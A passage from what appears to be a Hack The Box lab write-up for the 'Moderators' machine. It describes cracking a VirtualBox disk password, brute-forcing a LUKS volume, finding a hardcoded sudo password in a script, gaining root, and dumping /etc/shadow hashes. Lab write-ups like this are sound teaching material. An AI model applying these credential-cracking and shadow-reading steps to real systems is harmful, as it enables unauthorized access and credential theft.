[*] Password Found = computer
```


### Step 3
Download the _.vdi_ to your local machine and VirtualBox if you don't already have it. I use my Windows box where I have VirtualBox already installed.
Add the _.vbox_ file to create the new machine _"Moderator 1"_. In the settings status we see that it's missing _Ubuntu.vid_ and _2019.vdi_:

![[/assets/images/htb-writeup-moderators/moderators13.png]]

Instead of removing and adding new drives, open remove the machine `Moderator 1` and edit `2019-08-01.vbox`, change the location of the disks to whatever suits you.
```bash
      <HardDisks>
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="D:\2019.vdi" format="VDI" type="Normal">
		[... snip ...]
        <HardDisk uuid="{5999a8f0-e31d-4d4e-937d-173eb6ba8881}" location="Ubuntu.vdi" format="VDI" type="Normal"/>
      </HardDisks>
      <DVDImages>
        <Image uuid="{7653d755-c513-4004-8891-be83fc130dba}" location="D:\ubuntu-22.04-desktop-amd64.iso"/>
      </DVDImages>
```

Add the machine again and it should now detect _2019.vdi_, if it doesn't you may need to restart VirtualBox.

![[/assets/images/htb-writeup-moderators/moderators14.png]]

We're still not able to start the box, because of this _Ubuntu.vdi_, so lets just remove it from the _2019-08-01.vbox_ file.. delete these line:
```bash
<HardDisk uuid="{5999a8f0-e31d-4d4e-937d-173eb6ba8881}" location="Ubuntu.vdi" format="VDI" type="Normal"/>
[... snip ...]
  <DVDImages>
	<Image uuid="{7653d755-c513-4004-8891-be83fc130dba}" location="F:/ubuntu-22.04-desktop-amd64.iso"/>
  </DVDImages>
[... snip ...]
	<AttachedDevice type="HardDisk" hotpluggable="false" port="0" device="0">
	  <Image uuid="{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"/>
	</AttachedDevice>
```

I was stuck here for a while, even when mounting a new ubuntu ISO and booting I got nowhere.. then I remembered the disk is crypted, but already we have the password - `computer` 
Add it to the configurations and try again. Note that you need [VirtualBox Extension Pack](https://www.virtualbox.org/wiki/Downloads) to be able to edit this..

![[/assets/images/htb-writeup-moderators/moderators15.png]]

Now when booting we're able to choose "Try or Install Ubuntu":
![[/assets/images/htb-writeup-moderators/moderators16.png]]

![[/assets/images/htb-writeup-moderators/moderators17.png]]

Running `fdisk -l` and `df -h` we see that `/dev/sda` is not mounted, this is our disk `2019.vdi`. Mount it!
```bash
ubuntu@ubuntu:~$ sudo fdisk -l
[... snip ...]
Disk model: VBOX HARDDISK

ubuntu@ubuntu:~$ df -h
ubuntu@ubuntu:~$ sudo mount /dev/sda /tmp
mount: /tmp: unknown filesystem type 'crypto_LUKS'
```

![[/assets/images/htb-writeup-moderators/moderators18.png]]

### Step 4
Looking for ways to handle the LUKS encryption I find a few brute force tools, download and install [bruteforce-luks](https://github.com/glv2/bruteforce-luks) on the Virtual Box VM and get at it.
Very quickly we get the password - `abc123`

![[/assets/images/htb-writeup-moderators/moderators19.png]]

The disk only contains a directory named `scripts`, and within a set of subfolders. In the directory `all-in-one` there is one script with a timestamp that's not like the others - `distro_update.sh`
Look in the script and we find a password, probably for user `john` - `$_THE_best_Sysadmin_Ever_`

![[/assets/images/htb-writeup-moderators/moderators20.png]]

```bash
john@moderators:~/stuff/VBOX$ sudo su
[sudo] password for john: $_THE_best_Sysadmin_Ever_

root@moderators:/home/john/stuff/VBOX# id && cat /root/root.txt && cat /etc/shadow
uid=0(root) gid=0(root) groups=0(root)
fa3a5c96cf4976a1d91f804c6372e3db
root:$6$aqIOGu.rJRXjVGgt$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::
john:$6$PK0A253j816qSMhV$4Oy/1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::
lexi:$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67/:18890:0:99999:7:::
```
